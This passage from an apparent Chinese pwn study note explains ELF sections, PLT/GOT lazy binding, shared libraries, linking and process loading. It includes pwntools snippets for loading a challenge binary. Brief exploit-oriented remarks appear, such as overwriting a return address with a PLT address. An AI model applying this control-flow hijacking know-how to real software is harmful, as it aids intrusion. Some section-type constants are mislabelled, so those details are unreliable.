<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* Section header.  */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Word</span>    <span class=n>sh_name</span><span class=p>;</span>        <span class=cm>/* Section name(string tbl index)节名在字符串表中索引*/</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Word</span>    <span class=n>sh_type</span><span class=p>;</span>        <span class=cm>/* Section type 节类型*/</span>
</span></span><span class=line><span class=cl><span class=c1>//SHT_PROGBITS(1)代码段, SHT_PROGBITS(2)数据段, SHT_SYMTAB(2)符号表, SHT_STRTAB(3)字符串表
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>Elf32_Word</span>    <span class=n>sh_flags</span><span class=p>;</span>       <span class=cm>/* Section flags */</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Addr</span>    <span class=n>sh_addr</span><span class=p>;</span>        <span class=cm>/* Section virtual addr at execution
</span></span></span><span class=line><span class=cl><span class=cm>    								指定了节在可执行文件内存中加载地址*/</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Off</span> <span class=n>sh_offset</span><span class=p>;</span>      	  <span class=cm>/* Section file offset 节在文件中偏移量*/</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Word</span>    <span class=n>sh_size</span><span class=p>;</span>        <span class=cm>/* Section size in bytes 节大小*/</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Word</span>    <span class=n>sh_link</span><span class=p>;</span>        <span class=cm>/* Link to another section */</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Word</span>    <span class=n>sh_info</span><span class=p>;</span>        <span class=cm>/* Additional section information */</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Word</span>    <span class=n>sh_addralign</span><span class=p>;</span>       <span class=cm>/* Section alignment */</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Word</span>    <span class=n>sh_entsize</span><span class=p>;</span>     <span class=cm>/* Entry size if section holds table */</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Elf32_Shdr</span><span class=p>;</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20241101190727706.png alt=图片无法加载><p><strong>段（segment）与节（section)</strong></p><ol><li><strong>段</strong>：用于进程的内存区域的 rwx 权限划分，在加载和执行时被 OS 来管理内存和地址映射，提供对应虚拟内存的逻辑映射</li><li><strong>节</strong>：不参与内存的加载和执行，而用于链接器 Linker 和调试器 Debugger 对文件符号解析即重定位操作，提供对应文件的逻辑映射</li></ol><ul><li>代码段 Text Segment 包含函数代码与只读数据<ul><li><code>.text</code>节：代码节，存储程序可执行指令</li><li><code>.rodata</code>节：read only 只读数据节，只读常量</li><li><code>.hash</code>节</li><li><code>.dynsym</code>节</li><li><code>.dynstr</code>节</li><li><code>.plt</code>节（Procedure Linkage Table, 进程链接表）：包含一些代码<ul><li>调用链接器来解析某个外部函数的地址, 并填充到.got.plt 中, 然后跳转到该函数</li><li>直接在.got.plt 中查找并跳转到对应外部函数(如果已经填充过)</li></ul></li><li><code>.rel.got</code>节</li></ul></li><li>数据段 Data Segment 包含可读可写数据<ul><li><code>.data</code>节：已初始化的全局变量、静态变量，占用文件实际内存空间</li><li><code>.dynamic</code>节：动态节，存储动态链接信息，包括动态链接器需要的重定位表位置、依赖的共享对象名称、共享对象初始化代码的地址、动态链接符号表的位置、版本信息等</li><li><code>.got</code>节</li><li><code>.got.plt</code>节（.plt 的 GOT 全局偏移表）：保存全局函数真实地址<ul><li>如果在之前查找过该符号，内容为外部函数的具体地址</li><li>如果没查找过, 则内容为跳转回.plt 的代码, 并执行查找</li></ul></li><li><code>.bss</code>节：（Block Started by Symbol）未初始化的全局变量和静态变量，不占用文件实际内存空间，运行才分配空间初始化为 0</li></ul></li><li>栈段 Stack Segment<ul><li>局部变量，指针</li></ul></li></ul><p><strong>链接相关节</strong></p><ul><li><p>静态链接相关</p><ul><li><code>.symtab</code>节：符号表节，存储符号表信息：函数、变量、其他符号的名称、类型、地址等</li><li><code>.strtab</code>节：字符串表节，存储字符串数据：节名称、符号名称，被多个其他节引用</li><li><code>.rel.text</code>或<code>.rela.text</code>节：代码重定位节，链接时修正代码中符号引用</li><li><code>.rel.data</code>或<code>.rela.data</code>节：数据重定位节，链接时修正数据段中符号引用</li></ul></li><li><p>其他</p><ul><li><code>.note</code>节：注释节，存储注释或调试信息</li></ul></li><li><p>动态链接相关</p><ul><li><p><code>.interp</code>节：解释器 interpreter，保存字符串<code>/lib64/ld-linux-x86-64.so.2</code>，可执行文件所需动态链接器路径</p></li><li><p><code>.dynamic</code>节：由<code>ELF*_Dyn</code>组成的结构体数组</p><ul><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* Dynamic section entry. 64位区别 Sxword, Xword */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Sword</span>   <span class=n>d_tag</span><span class=p>;</span>          <span class=cm>/* Dynamic entry type */</span>
</span></span><span class=line><span class=cl>    <span class=k>union</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Elf32_Word</span> <span class=n>d_val</span><span class=p>;</span>         <span class=cm>/* Integer value 整数类型*/</span>
</span></span><span class=line><span class=cl>        <span class=n>Elf32_Addr</span> <span class=n>d_ptr</span><span class=p>;</span>         <span class=cm>/* Address value 指针类型*/</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=n>d_un</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Elf32_Dyn</span><span class=p>;</span></span></span></code></pre></div></div></li><li><p><code>DT_SYMTAB</code>指定<strong>符号表地址</strong>，<code>DT_STRTAB</code>指定<strong>字符串表地址</strong>，<code>DT_REL/DT_RELA</code>：指定<strong>重定位表地址</strong></p></li></ul></li><li><p><code>.dynsym</code>节：动态符号表，由<code>Elf*_Sym</code>构成的结构体数组，只保存与动态链接相关符号</p><ul><li>同时拥有<code>.symtab</code>保存所有符号，辅助表：动态符号字符串表<code>.dynstr</code>，符号哈希表<code>.hash</code></li></ul></li><li><p><code>.rel.dyn/.rel.data</code>节：动态链接重定位表，动态链接运行时才将导入符号的引用进行修正，共享对象重定位在装载时完成</p><ul><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* Relocation table entry without addend (in section of type SHT_REL).  */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Addr</span>    <span class=n>r_offset</span><span class=p>;</span>       <span class=cm>/* Address 需要重定位的位置的偏移值 */</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Word</span>    <span class=n>r_info</span><span class=p>;</span>         <span class=cm>/* Relocation type and symbol index */</span>
</span></span><span class=line><span class=cl>                    <span class=c1>// 低 8 位表示符号重定位类型
</span></span></span><span class=line><span class=cl><span class=c1></span>                    <span class=c1>// 高 24 位表示该符号在符号表中索引
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span> <span class=n>Elf32_Rel</span><span class=p>;</span></span></span></code></pre></div></div></li><li><p><code>.rel.dyn</code>对数据引用修正，修正位置位于<code>.got</code>及数据段</p></li><li><p><code>.rel.plt</code>对函数引用修正，修正位置位于<code>.got.plt</code></p></li></ul></li></ul></li></ul><p><strong>三个 ELF 表</strong></p><ol><li><strong>PLT（Procedure Linkage Table）:</strong><ol><li><code>elf.plt['system']</code> 通常是用于调用共享库中函数的入口点。PLT 中的代码负责将控制转移到真正的函数地址，这是通过动态链接的方式实现的。因此，PLT 中的地址是一个入口点，负责实际跳转到共享库中的函数。</li><li>调用外部函数的一组跳转表，每个函数对应一个入口，包含可执行代码，覆盖返回地址为 plt 地址可最终跳转导向到 got 表中的函数地址处</li><li>未开启<code>FULL RELRO</code>，PLT 表在 <code>.plt</code></li><li>开启<code>FULL RELRO</code>，PLT 表在 <code>.plt.sec</code> ：GOT 表装载时已完成重定位且不可写所以不存在延迟绑定，PLT 直接根据 GOT 表存储的函数地址进行跳转</li></ol></li><li><strong>Symbol Table:</strong><ol><li><code>elf.symbols['system']</code> 返回的是 ELF 文件中符号表中 <code>system</code> 函数的地址。这个地址是在编译时确定的，是链接时的静态地址。在编译时，链接器会将符号解析为实际的地址。</li></ol></li><li><strong>GOT（Global Offset Table，全局偏移表）:</strong><ol><li><code>elf.got['system']</code> 返回的是 ELF 文件中的 GOT 表中 <code>system</code> 函数的入口地址。全局表存储外部函数或库函数真实地址，GOT 表中的地址是一个指针，指向共享库/动态链接器中的真实函数地址。在运行时，当程序第一次调用一个共享库中的函数时，PLT 中的代码会更新 GOT 表中的地址，将其设置为实际函数的地址</li><li>保存全局变量/外部符号地址</li><li>不用于直接调用，只保存了实际函数地址，不是可执行的指令，覆盖返回地址不用 got 表地址覆盖</li><li>ELF 将 GOT 拆分成 <code>.got</code> 和 <code>.got.plt</code> ， <code>.got</code> 保存全局变量引用的地址，<code>.got.plt</code> 保存函数引用的地址</li></ol></li></ol><h2 id=共享库>共享库</h2><p>命名规则：<code>libname.so.x.y.z</code>，xyz:主版本号、次版本号、发布版本号</p><p><strong>SO-NAME</strong></p><ul><li>每个共享库都有一个对应的 SO-NAME，依赖某个共享库的模块在编译、链接和运行时使用共享库的 SO-NAME 而不使用详细版本号</li><li>系统会为每个共享库在它所在的目录创建一个跟 SO-NAME 相同的并且指向它的软链接（Symbol Link）</li><li>稍高版本的 libc 的 <code>libc.so.6</code> 本身就是动态库，不是符号链接，动态链接文件中 <code>.dynamic</code> 段中 <code>DT_NEED</code> 类型字段就是 SO-NAME</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 动态库</span>
</span></span><span class=line><span class=cl>$ ls -l /lib/x86_64-linux-gnu/libc.so.6
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root root <span class=m>12</span> May  <span class=m>1</span>  <span class=m>2024</span> /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.31.so <span class=c1># glibc 2.31</span>
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root <span class=m>2029592</span> May  <span class=m>1</span>  <span class=m>2024</span> /lib/x86_64-linux-gnu/libc-2.31.so
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root <span class=m>2125328</span>  8月  <span class=m>8</span> 22:47 /lib/x86_64-linux-gnu/libc.so.6 <span class=c1># glibc 2.39</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 动态链接器</span>
</span></span><span class=line><span class=cl>$ ls -al /lib64/ld-linux-x86-64.so.2
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root root <span class=m>32</span> May  <span class=m>1</span>  <span class=m>2024</span> /lib64/ld-linux-x86-64.so.2 -&gt; /lib/x86_64-linux-gnu/ld-2.31.so
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root root <span class=m>44</span>  8月  <span class=m>8</span> 22:47 /lib64/ld-linux-x86-64.so.2 -&gt; ../lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span></span></code></pre></div></div><p><strong>共享库系统路径</strong></p><ol><li><code>/lib</code>：包含 OS 核心组件所需共享库文件，与内核相关</li><li><code>/usr/lib</code>：包含 OS 提供的额外共享库文件，GUI、网络库、数据库驱动程序</li><li><code>/usr/local/lib</code>：安装本地软件库文件默认位置，用户手动编译安装软件</li></ol><p><strong>更改共享库</strong></p><p>环境变量</p><ul><li><code>LD_LIBRARY_PATH</code>：为进程设置，则启动时动态链接器会首先查找该环境变量指定的目录，会导致地址布局差异</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./lib/ld.so --preload libdl.so.2 ./pwn&#34;</span><span class=o>.</span><span class=n>split</span><span class=p>(),</span> <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_LIBRARY_PATH&#34;</span><span class=p>:</span> <span class=s2>&#34;./lib/&#34;</span><span class=p>})</span></span></span></code></pre></div></div><ul><li><code>LD_PRELOAD</code>：指定预先装载的共享库，无论是否依赖都装载，也会导致地址布局差异</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>process</span><span class=p>(</span><span class=s2>&#34;./lib/ld.so ./pwn&#34;</span><span class=o>.</span><span class=n>split</span><span class=p>(),</span> <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_PRELOAD&#34;</span><span class=p>:</span> <span class=s2>&#34;./lib/libc.so.6&#34;</span><span class=p>})</span></span></span></code></pre></div></div><ul><li><code>LD_DEBUG</code>：可以打开动态链接器的调试功能</li></ul><h2 id=进程>进程</h2><img src=/img/pwn_note.zh-cn.assets/image-20241029142856545.png alt=图片无法加载><h3 id=编译>编译</h3><p>广义编译包括：</p><ul><li><p><strong>预处理/预编译</strong>：处理<code>#</code> 开始的预编译指令</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gcc -E hello.c -o hello.i <span class=c1># C++中.cpp/.cxx/.hpp预编译为.ii</span>
</span></span><span class=line><span class=cl>cpp hello.c &gt; hello.i</span></span></code></pre></div></div><ul><li><p>删除<code>#define</code>，展开所有宏定义</p></li><li><p>处理条件预编译指令<code>#if, #ifdef, #elif, #else, #endif</code></p></li><li><p>处理<code>#include</code>，将被包含文件递归插入到该位置</p></li><li><p>删除所有注释<code>//, /* */</code></p></li><li><p>添加行号和文件名标识，保留所有<code>#pragma</code></p></li></ul></li><li><p><strong>编译</strong>：将预处理后文件进行<strong>词法分析、语法分析、语义分析、优化</strong>后产生汇编代码</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gcc -S hello.i -o hello.s -masm<span class=o>=</span>intel <span class=c1># 指定汇编风格</span></span></span></code></pre></div></div></li><li><p><strong>汇编</strong>：汇编代码转换为机器码</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>as hello.s -o hello.o
</span></span><span class=line><span class=cl>gcc -c hello.c -o hello.o <span class=c1># 可重定位文件/目标文件</span></span></span></code></pre></div></div></li></ul><h3 id=链接>链接</h3><p>将多个目标文件及库文件生成最终可执行文件或共享库</p><img src=/img/pwn_note.zh-cn.assets/172844297857414.png alt=图片无法加载><h4 id=静态链接>静态链接</h4><img src=/img/pwn_note.zh-cn.assets/172844297857412.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ld a.o b.o -o ab
</span></span><span class=line><span class=cl>gcc a.o b.o -o out.elf</span></span></code></pre></div></div><p><strong>合并代码和数据段</strong></p><p>多个目标文件中代码段和数据段合并成一个</p><p><strong>符号解析</strong></p><ul><li>链接器通过<strong>重定位表</strong>解析目标文件中包含的对其他目标文件或库中定义的符号引用，修复对应机器码</li><li>需要重定位的 ELF 都有对应重定位段，<code>.text</code>有<code>.rel.text</code>，<code>.data</code>有<code>.rel.data</code></li><li>通过<code>Elf32_Rel</code>：<ul><li>``r_offset`加上段起始得到<strong>重定位入口位置</strong></li><li><code>r_info</code>低 8 位得<strong>重定位类型</strong></li><li><code>r_info</code>高 24 位得到重定位符号在符号表<code>.symtab</code>中的<strong>下标</strong></li></ul></li></ul><p><strong>符号重定位</strong></p><ul><li><code>Elf32_Rel</code>中<code>st_value</code>表示符号在段中偏移，根据重定位类型计算入口需要修正的值并修正</li><li>32 位常用<strong>重定位类型</strong>：<ul><li><code>R_386_32</code>：绝对地址</li><li><code>R_386_PC32</code>：相对当前指令地址的下一条指令相对地址</li></ul></li></ul><p><strong>解析库依赖关系</strong></p><p>目标文件依赖于外部库（标准/第三方），将所需的库文件链接到最终可执行文件中</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/lib/x86_64-linux-gnu/libc.a <span class=c1># 包含多个.o文件</span></span></span></code></pre></div></div><p><strong>生成重定位表</strong></p><p>每次程序地址加载变化，需要生成重定位表，以便在可执行文件在加载和执行时进行正确的符号重定位</p><h4 id=动态链接>动态链接</h4><img src=/img/pwn_note.zh-cn.assets/172844297857413.png alt=图片无法加载><p>运行时才链接</p><p><strong>装载时重定位</strong></p><p>加载时将模块中相关地址修改为正确的值，模块装载到不同位置会导致模块代码段内容改变，无法实现共享库复用，浪费内存</p><p><strong>地址无关代码(PIC, Position-independent Code)</strong></p><p>把指令中那些需要被修改的部分分离，与数据部分放一起，指令部分保持不变，数据部分每个进程拥有一个副本</p><ul><li>模块内部函数调用、数据访问：<code>[rip + xxx]</code>实现引用</li><li>模块间函数调用、数据访问：数据段建立一个指向变量的指针数组<strong>全局偏移表(Global Offset Table, GOT)</strong>，<ul><li>共享模块被加载，若某全局变量在可执行文件中拥有副本，动态链接器把 GOT 中相应地址指向该副本，若变量在共享模块被初始化，动态链接器需将该初始化值复制到程序主模块中的变量副本</li><li>若该全局变量在主模块中无副本，GOT 相应地址指向共享模块内部的该变量副本</li></ul></li></ul><p><strong>延迟绑定</strong></p><ul><li><p>当函数第一次被用到时才由动态链接器进行绑定（符号查找、重定位等）</p></li><li><p><code>link_map</code>：保存进程载入的动态链接库</p></li><li><p><code>dl_runtime_resolve</code>：装载器中用于解析动态链接库中函数的实际地址的函数</p></li></ul><p><code>.text</code>节中调用 libc 动态链接库中 puts 函数<code>call puts@plt</code>，取代码段中<code>.plt</code>节(plt 表中每一项是一个调用函数的表项)</p><p><strong>首次调用 puts 函数</strong></p><ol><li>跳转到<code>.plt</code>中 puts 表项</li><li>【<code>jmp *(puts@GOT)</code>】跳转到<code>.got.plt</code>中记录的地址</li><li><code>.got.plt</code>未解析该函数地址，存的是<code>.plt</code>对应函数地址【<code>puts@plt+"1"/6</code>】，跳回<code>.plt</code>中</li><li>执行【<code>push index</code>】和【<code>jmp PLT0</code>】，index 是 puts 在 plt 表中对应索引</li><li>跳转到 PLT0 执行【<code>push *(GOT+4)</code>】，表示用到哪个动态链接库<code>link_map</code>，执行【<code>jmp *(GOT+8)</code>】跳到 GOT 表</li><li>进入<code>_dl_runtime_resolve</code>函数解析 puts 函数实际地址<ol><li>用第一个参数<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr, .dynsym, .rel.plt</code>指针，分别运算求出符号名字符串指针、当前符号表项指针、当前函数重定位表项指针</li><li>动态链接库查找该函数地址</li></ol></li><li>填入到<code>.got.plt</code>中</li><li>调用 puts 函数</li></ol><img src=/img/pwn_note.zh-cn.assets/image-20241103171751750.png alt=图片无法加载><p><strong>再次调用 puts 函数</strong></p><ol><li>跳转到<code>.plt</code>中 puts 表项</li><li>跳转到<code>.got.plt</code></li><li>从<code>.got.plt</code>跳转到<code>puts</code>真实地址</li></ol><img src=/img/pwn_note.zh-cn.assets/image-20241103171805836.png alt=图片无法加载><p><strong>动态链接过程</strong></p><ul><li><strong>动态链接器自举</strong>：自身重定位，OS 将进程控制权交给动态链接器，自举代码找自己的 GOT，第一个入口即为<code>.dynamic</code>段，获取本身的重定位表和符号表，进行重定位</li><li><strong>装载共享对象</strong>：动态链接器将可执行文件和本身符号表合并为全局符号表，然后寻找共享对象，将其名字放入装载集合中，找到相应文件读取 ELF 文件头和<code>.dynamic</code>段的相应代码段和数据段映射到进程空间</li><li><strong>重定位和初始化</strong>：重新遍历可执行文件和每个共享对象的重定位表，修正 GOT/PLT 中位置；若共享对象有<code>.init</code>段，动态链接器执行实现对象中 C++全局/静态对象构造初始化，<code>.fini</code>段用于进程退出实现 C++全局对象析构操作，不执行进程可执行文件的<code>.init</code>段</li></ul><h3 id=装载>装载</h3><ol><li>输入<code>./elf</code>，用户层 bash 进程调用<code>fork()</code>系统调用创建新进程，新进程调用<code>execve()</code>系统调用执行 elf 文件，以全新程序替代当前运行程序；原先 bash 进程返回等待新进程结束后，继续等待用户命令</li><li>内核开始装载，<code>execve()</code>对应入口是<code>sys_execve()</code>检查参数</li><li>调用<code>do_execve()</code>查找被执行文件，找到后读取前 128 字节判断文件格式，头 4 个字节为魔数：ELF 头<code>x7felf</code>，Java 可执行文件头<code>cafe</code>，Shell/python 等解释型语言第一行<code>#!/bin/sh</code>或<code>#!/usr/bin/python</code></li><li>调用<code>search_binary_handle</code>搜索匹配合适可执行文件<strong>装载处理过程</strong>并调用：<code>ELF</code>可执行文件对应<code>load_elf_binary()</code>，<code>a.out</code>可执行文件对应<code>load_aout_binary</code>，可执行脚本程序对应<code>load_script</code><ul><li>检查 ELF 文件格式有效性：魔数、段数量</li><li>找动态链接的<code>.interp</code>段设置动态链接器路径</li><li>根据程序头表，对 ELF 进行映射：代码、数据、只读数据</li><li>初始化进程环境</li><li>系统调用返回地址修改为 ELF 入口地址【<strong>静态链接</strong>入口是文件头<code>e_entry</code>所指地址；<strong>动态链接</strong>入口是<strong>动态链接器 ld</strong>】</li></ul></li><li><code>load_XX</code>函数执行完毕返回最初<code>sys_execve()</code>返回用户态，EIP 寄存器跳转到 ELF 程序入口地址，执行新程序</li></ol><h3 id=执行>执行</h3><p><strong>初始化栈</strong></p><ul><li>OS 在进程启动前将系统环境变量和进程运行参数提前保存在进程虚拟空间栈中，静态程序<code>_start</code>处寄存器基本为 0，动态程序寄存器大多为垃圾数据</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241104201214504.png alt=图片无法加载><ol><li><p>rsp 指向<strong>命令行参数个数</strong>【argc】</p></li><li><p>指向各个命令行参数字符串的指针数组【argv】，以 0 结尾</p></li><li><p>指向环境变量字符串的指针数组【envp】，以 0 结尾</p></li><li><p>辅助向量信息数组：OS 将其提供给动态链接器</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>a_type</span><span class=p>;</span>      <span class=cm>/* Entry type 辅助向量的条目类型 */</span>
</span></span><span class=line><span class=cl>	<span class=c1>// 可执行文件文件描述符，程序头表地址及每个条目大小、条目数量，页面大小，共享对象基址，OS标志位，程序入口地址
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>union</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    	<span class=kt>uint32_t</span> <span class=n>a_val</span><span class=p>;</span>       <span class=cm>/* Integer value 辅助向量的值 */</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=n>a_un</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Elf32_auxv_t</span><span class=p>;</span></span></span></code></pre></div></div></li></ol><img src=/img/pwn_note.zh-cn.assets/image-20241104203131933.png>
<img src=/img/pwn_note.zh-cn.assets/172844664601225.png alt=图片无法加载><ul><li><p>运行程序时，shell 调用 linux 系统调用 <code>execve()</code> 设置一个堆栈，将 <code>argc</code> 、 <code>argv</code> 和 <code>envp</code> 压入其中</p></li><li><p>文件描述 0、1 和 2（<code>stdin</code> 、<code>stdout</code> 、<code>stderr</code>）保留为 shell 设置的值，动态链接器完成重定位工作</p></li><li><p>调用 <code>_start()</code> 设置 <code>___libc_start_main</code> 函数所需参数</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>STATIC</span> <span class=kt>int</span>
</span></span><span class=line><span class=cl><span class=nf>LIBC_START_MAIN</span> <span class=p>(</span><span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>main</span><span class=p>)</span> <span class=p>(</span><span class=kt>int</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span> <span class=n>MAIN_AUXVEC_DECL</span><span class=p>),</span> <span class=c1>// main函数
</span></span></span><span class=line><span class=cl><span class=c1></span>                 <span class=kt>int</span> <span class=n>argc</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                 <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                 <span class=nf>__typeof</span> <span class=p>(</span><span class=n>main</span><span class=p>)</span> <span class=n>init</span><span class=p>,</span> 		<span class=c1>// main 调用前的初始化工作, 默认是 __libc_csu_init 函数指针
</span></span></span><span class=line><span class=cl><span class=c1></span>                 <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>fini</span><span class=p>)</span> <span class=p>(</span><span class=kt>void</span><span class=p>),</span>		<span class=c1>// main 结束后的收尾工作, 默认是 __libc_csu_fini 函数指针
